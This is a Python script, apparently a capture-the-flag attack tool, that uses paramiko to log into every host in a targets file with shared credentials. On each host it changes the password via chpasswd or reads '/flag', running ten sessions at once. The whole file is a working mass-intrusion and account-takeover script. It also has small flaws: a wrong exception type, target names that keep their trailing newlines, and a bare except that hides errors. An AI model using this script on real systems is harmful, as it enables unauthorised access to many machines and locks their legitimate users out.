import paramiko
from concurrent.futures import ThreadPoolExecutor


def _sshtask(target, username, password, cmd,port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=username, password=password,port=port)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        out_result = stdout.read().decode('utf-8')
        err_result = stderr.read().decode('utf-8')
        if out_result:
            return out_result
        elif err_result:
            return err_result
    except:
        return None


def sshscan(username, password, cmd, port):
    try:
        with open("../targets.txt",'r') as f:
            targets = f.readlines()
    except FileExistsError as e:
        print(e)

    if cmd == "1":
        cmd = "echo {0}:{1} | chpasswd".format(username, password)
    if cmd == "2":
        cmd = "cat /flag"

    with ThreadPoolExecutor(10) as executor:
        futures = [executor.submit(_sshtask, target, username, password, cmd, port) for target in targets]
        # 处理已完成的任务的future对象
        for future in futures:
            # 通过future.result()函数获取结果
            print(future.result())